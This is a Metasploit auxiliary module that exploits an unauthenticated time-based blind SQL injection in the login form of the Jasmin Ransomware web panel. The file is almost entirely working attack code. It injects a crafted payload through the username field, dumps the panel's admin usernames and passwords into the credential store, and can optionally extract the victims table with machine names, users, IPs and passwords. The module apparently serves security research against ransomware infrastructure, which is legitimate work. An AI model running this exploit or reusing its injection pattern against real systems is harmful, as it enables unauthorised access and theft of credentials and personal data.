##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jasmin Ransomware Web Server Unauthenticated SQL Injection',
        'Description' => %q{
          The Jasmin Ransomware web server contains an unauthenticated SQL injection vulnerability
          within the login functionality. As of April 15, 2024 this was still unpatched, so all
          versions are vulnerable. The last patch was in 2021, so it will likely not ever be patched.

          Retrieving the victim's data may take a long amount of time. It is much quicker to
          get the logins, then just login to the site.
        },
        'References' => [
          ['URL', 'https://github.com/chebuya/CVE-2024-30851-jasmin-ransomware-path-traversal-poc'],
          ['URL', 'https://github.com/codesiddhant/Jasmin-Ransomware']
        ],
        'Author' => [
          'chebuya', # discovery, PoC
          'h00die', # metasploit module
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2023-04-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Jasmin Ransomware webserver', '/']),
        OptBool.new('VICTIMS', [false, 'Retrieve data on the victims', false]),
        OptInt.new('VICTIMLIMIT', [false, 'Number of victims data to pull']),
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path)
    )
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    return Exploit::CheckCode::Detected('Jasmin Login page detected') if res.body.include? '<title>Jasmin Dashboard</title>'

    Exploit::CheckCode::Safe("#{peer} - Jasmin login page not found")
  end

  def run
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      check_char = Rex::Text.rand_text_alpha_lower(5)
      res = send_request_cgi({
        'keep_cookies' => true,
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'checklogin.php'),
        'vars_post' => {
          'username' => "#{Rex::Text.rand_text_alpha_lower(1)}' AND (SELECT 1 FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha_lower(1)}) AND '#{check_char}'='#{check_char}",
          'password' => '',
          'service' => 'login'
        }
      })
      fail_with(Failure::Unreachable, 'Connection failed') unless res
    end

    fail_with(Failure::NotVulnerable, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.") unless @sqli.test_vulnerable

    columns = ['admin', 'creds']
    vprint_status('Dumping login table')
    data = @sqli.dump_table_fields('master', columns, '')
    table = Rex::Text::Table.new('Header' => 'Logins', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :password,
        private_data: user[1],
        service_name: 'Jasmin Webpanel',
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)

    return unless datastore['VICTIMS']

    vprint_status('Dumping victim table')
    columns = ['machine_name', 'computer_user', 'ip', 'systemid', 'password']
    if datastore['VICTIMLIMIT'].nil?
      data = @sqli.dump_table_fields('victims', columns, '')
    else
      data = @sqli.dump_table_fields('victims', columns, '', datastore['VICTIMLIMIT'])
    end
    table = Rex::Text::Table.new('Header' => 'Victims', 'Indent' => 1, 'Columns' => columns)
    data.each do |victim|
      table << victim
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)
  end
end
